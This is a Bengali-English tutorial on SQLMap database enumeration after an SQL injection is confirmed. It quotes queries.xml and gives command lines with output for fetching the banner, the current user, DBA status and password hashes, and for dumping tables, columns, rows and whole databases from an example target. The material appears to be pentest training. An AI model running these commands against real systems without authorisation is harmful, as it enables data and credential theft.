## **Database Enumeration**


## 1. Database Enumeration কী?

- SQLi vulnerability successfully detect ও exploit confirm করার পর Enumeration শুরু হয়।
- এটি SQL Injection attack-এর central part।
- Vulnerable database থেকে available information খুঁজে বের করা ও retrieve (exfiltration) করাই এর কাজ।

## 2. SQLMap Data Exfiltration

- SQLMap supported DBMS অনুযায়ী predefined SQL queries ব্যবহার করে।
- প্রতিটি query target থেকে নির্দিষ্ট information retrieve করে।
- Query-গুলো `queries.xml` file-এ থাকে।

[SQLMap queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml?utm_source=chatgpt.com)

MySQL-এর `queries.xml` example:

```
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```

গুরুত্বপূর্ণ query:

| Information      | SQL Query        | SQLMap Switch    |
| ---------------- | ---------------- | ---------------- |
| Database version | `VERSION()`      | `--banner`       |
| Current user     | `CURRENT_USER()` | `--current-user` |
| Current database | `DATABASE()`     | `--current-db`   |
| Hostname         | `@@HOSTNAME`     | `--hostname`     |

- `--current-user` দিয়ে current username পেতে `CURRENT_USER()` ব্যবহার হয়।
- `<users>` থেকে username retrieve করার জন্য দুটি query type রয়েছে:
  - `inband`: Non-blind SQLi (UNION-query ও error-based) ব্যবহার করে। Query result সরাসরি response-এ পাওয়া যায়।
  - `blind`: Blind SQLi-তে ব্যবহার হয়। Data row-by-row, column-by-column ও bit-by-bit retrieve করা হয়।

## 3. Basic DB Data Enumeration

SQLi confirm হওয়ার পর database-এর basic information retrieve করা যায়।

| Information             | SQLMap Switch    |
| ----------------------- | ---------------- |
| Database version banner | `--banner`       |
| Current username        | `--current-user` |
| Current database        | `--current-db`   |
| DBA privileges check    | `--is-dba`       |
| Hostname                | `--hostname`     |
| Password hashes         | `--passwords`    |

SQLMap আগে থেকেই SQLi identify করে থাকলে detection skip করে সরাসরি enumeration শুরু করে।

Command:

```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## 4. Table Enumeration

Current database name জানা থাকলে `--tables` দিয়ে table names retrieve করা যায়। `-D` দিয়ে database name দিতে হয়।

Command:

```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Output:

```
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

এখানে `testdb` database-এ ৪টি table পাওয়া গেছে।

### Table Content Dump

পছন্দের table-এর data retrieve করতে `--dump` এবং table name-এর জন্য `-T` ব্যবহার করা হয়।

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

Output:

```
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
```

- Table data formatted CSV হিসেবে local file-এ save হয়।
- File: `users.csv`
- `--dump-format` দিয়ে CSV ছাড়াও HTML বা SQLite format select করা যায়। পরে SQLite environment-এ database investigate করা যাবে।

## 5. Table/Row Enumeration

### নির্দিষ্ট Column Retrieve

বড় table-এর সব column দরকার না হলে `-C` দিয়ে নির্দিষ্ট column select করা যায়।

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

Output:

```
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

### নির্দিষ্ট Row Retrieve

Ordinal number অনুযায়ী row select করতে:

- `--start`: কোন row থেকে শুরু হবে।
- `--stop`: কোন row-এ শেষ হবে।

Example: 2nd থেকে 3rd entry পর্যন্ত।

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

Output:

```
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

## 6. Conditional Enumeration

নির্দিষ্ট `WHERE` condition অনুযায়ী row retrieve করতে `--where` ব্যবহার করা হয়।

Example: যেসব name `f` দিয়ে শুরু:

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Output:

```
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

## 7. Full DB Enumeration

- নির্দিষ্ট database-এর সব table dump করতে `-T` বাদ দিয়ে `--dump -D testdb` ব্যবহার করা যায়।
- `--dump`-এর সঙ্গে `-T` না দিলে current database-এর সব content retrieve হবে।
- `--dump-all` দিয়ে সব database-এর সব content retrieve করা যায়।
- System database বাদ দিতে `--exclude-sysdbs` ব্যবহার করা হয়। Pentester-দের জন্য system database সাধারণত কম গুরুত্বপূর্ণ।

Example:

```
--dump-all --exclude-sysdbs
```
